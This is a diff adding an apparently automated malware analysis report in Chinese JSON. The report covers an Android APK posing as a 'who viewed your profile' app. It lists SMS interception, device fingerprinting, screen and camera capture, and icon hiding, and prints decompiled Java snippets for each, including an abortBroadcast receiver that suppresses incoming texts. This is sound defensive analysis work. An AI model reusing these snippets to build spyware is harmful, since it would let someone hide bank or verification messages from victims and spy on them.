@@ -1,0 +1,194 @@
+{
+  "APK信息": {
+    "文件名": "bf030e033937d1924ec8698a071f1523339950758b208acf66e60490e75a0519.apk",
+    "sha256": "bf030e033937d1924ec8698a071f1523339950758b208acf66e60490e75a0519",
+    "包名": "coy.newring.fcb",
+    "应用名": "Quem viu teu perfil",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 657.8
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lanywheresoftware\\b4a\\phone\\PhoneEvents;",
+          "method_signature": "if(res != null && res.booleanValue()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (intent.getAction().equals(\"android.provider.Telephony.SMS_RECEIVED\") && (bundle = intent.getExtras()) != null) {\n    Object[] pduObj = (Object[]) bundle.get(\"pdus\");\n    for (Object obj : pduObj) {\n        SmsMessage sm = SmsMessage.createFromPdu((byte[]) obj);\n        Boolean res = (Boolean) ba.raiseEvent(SMSInterceptor.this, String.valueOf(SMSInterceptor.this.eventName) + \"_messagereceived\", sm.getOriginatingAddress(), sm.getMessageBody());\n        if (res != null && res.booleanValue()) {\n            abortBroadcast();\n        }\n    }\n}\nIntentFilter fil = new IntentFilter(\"android.provider.Telephony.SMS_RECEIVED\");\nfil.setPriority(Priority);\nBA.applicationContext.registerReceiver(this.f1br, fil);",
+          "malicious_code_snippet_context": "                  @Override // android.content.BroadcastReceiver\n                  public void onReceive(Context context, Intent intent) {\n                      Bundle bundle;\n>>>                     if (intent.getAction().equals(\"android.provider.Telephony.SMS_RECEIVED\") && (bundle = intent.getExtras()) != null) {\n>>>                         Object[] pduObj = (Object[]) bundle.get(\"pdus\");\n>>>                         for (Object obj : pduObj) {\n>>>                             SmsMessage sm = SmsMessage.createFromPdu((byte[]) obj);\n>>>                             Boolean res = (Boolean) ba.raiseEvent(SMSInterceptor.this, String.valueOf(SMSInterceptor.this.eventName) + \"_messagereceived\", sm.getOriginatingAddress(), sm.getMessageBody());\n>>>                             if (res != null && res.booleanValue()) {\n>>>                                 abortBroadcast();\n>>>                             }\n>>>                         }\n>>>                     }\n>>>                 }\n>>>             };\n>>>             IntentFilter fil = new IntentFilter(\"android.provider.Telephony.SMS_RECEIVED\");\n              fil.setPriority(Priority);\n              BA.applicationContext.registerReceiver(this.f1br, fil);\n          }",
+          "behavior_description": "代码注册了一个高优先级的SMS_RECEIVED广播接收器，监听所有 incoming SMS。收到短信后，从PDU中提取发件人地址和短信内容，通过B4A事件回调将短信数据传递给上层逻辑进行过滤判断。若回调返回true，则调用abortBroadcast()中止广播继续传递，导致系统默认短信应用无法收到该短信，用户不会看到任何通知。这是典型的短信拦截行为，可用于隐藏验证码、银行通知等关键短信，配合后续欺诈操作造成用户损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "getSubscriberId"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lanywheresoftware\\b4a\\phone\\Phone;",
+          "method_signature": "GetDeviceId()",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static String GetDeviceId() {\n    TelephonyManager tm = (TelephonyManager) BA.applicationContext.getSystemService(\"phone\");\n    String s = tm.getDeviceId();\n    return s == null ? \"\" : s;\n}",
+          "malicious_code_snippet_context": "      @BA.ShortName(\"PhoneId\")\n      /* loaded from: classes.dex */\n      public static class PhoneId {\n>>>         public static String GetDeviceId() {\n>>>             TelephonyManager tm = (TelephonyManager) BA.applicationContext.getSystemService(\"phone\");\n>>>             String s = tm.getDeviceId();\n>>>             return s == null ? \"\" : s;\n>>>         }\n  \n          public static String GetLine1Number() {\n              TelephonyManager tm = (TelephonyManager) BA.applicationContext.getSystemService(\"phone\");",
+          "behavior_description": "代码通过 TelephonyManager 获取系统电话服务，调用 getDeviceId() 采集设备唯一标识符(IMEI)，并将结果返回供调用方使用。在已确认的恶意样本中，该行为属于设备指纹采集，通常用于唯一标识和追踪受害者设备，为后续的恶意活动(如C2通信、数据上报)提供设备身份信息。数据流向：TelephonyManager.getDeviceId() → 返回IMEI标识供恶意程序后续使用。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "screen_capture",
+      "中文名": "屏幕截图/录屏",
+      "MITRE": "T1413",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "MediaProjection",
+          "createVirtualDisplay",
+          "takeScreenshot"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\tillekesoft\\screenrecorder\\B4AContinuousScreenShots;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "screen_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "MediaProjection; MediaProjectionManager; ImageReader; ByteArrayOutputStream;",
+          "malicious_code_snippet_context": "MediaProjection; MediaProjectionManager; ImageReader; ByteArrayOutputStream;",
+          "behavior_description": "代码声明了 MediaProjection、MediaProjectionManager、ImageReader 和 ByteArrayOutputStream 等用于屏幕截图和录屏的 API，意图捕获设备屏幕显示内容并转换为字节数组，可能用于外传窃取用户隐私。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
+        "字符串": [
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcoy\\newring\\fcb\\cameraexclass;",
+          "method_signature": "_vvvvvvvvvvv2()",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this._vvvvvvvvvvv4.TakePicture();",
+          "malicious_code_snippet_context": "      }\n  \n      public String _vvvvvvvvvvv2() throws Exception {\n>>>         this._vvvvvvvvvvv4.TakePicture();\n          return \"\";\n      }\n  ",
+          "behavior_description": "该方法通过调用Camera对象的TakePicture()方法秘密拍摄照片。在已确认的恶意样本中，此摄像头封装类提供了StartPreview/StopPreview/TakePicture三个控制方法，TakePicture()为实际拍照触发点，拍摄的照片通常会被后续逻辑（如_picturetaken事件回调）保存并上传至C2服务器，构成隐私窃取行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcoy\\newring\\fcb\\execucoes;",
+          "method_signature": "switch(BA.switchObjectToInt(Integer.valueOf((int)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "javaObject.RunMethod(\"setComponentEnabledSetting\", new Object[]{\"coy.newring.fcb.main\", 2});",
+          "malicious_code_snippet_context": "          javaObject.InitializeContext(processBA);\n          switch (BA.switchObjectToInt(Integer.valueOf((int) BA.ObjectToNumber(javaObject.RunMethod(\"getComponentEnabledSetting\", new Object[]{\"coy.newring.fcb.main\"}))), 0, 1)) {\n              case 0:\n>>>                 javaObject.RunMethod(\"setComponentEnabledSetting\", new Object[]{\"coy.newring.fcb.main\", 2});\n                  return \"\";\n              case 1:\n                  javaObject.RunMethod(\"setComponentEnabledSetting\", new Object[]{\"coy.newring.fcb.main\", 2});",
+          "behavior_description": "代码通过调用setComponentEnabledSetting方法，将主组件\"coy.newring.fcb.main\"的启用状态设置为2（COMPONENT_ENABLED_STATE_DISABLED），从而在桌面隐藏应用图标，防止用户发现和卸载。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
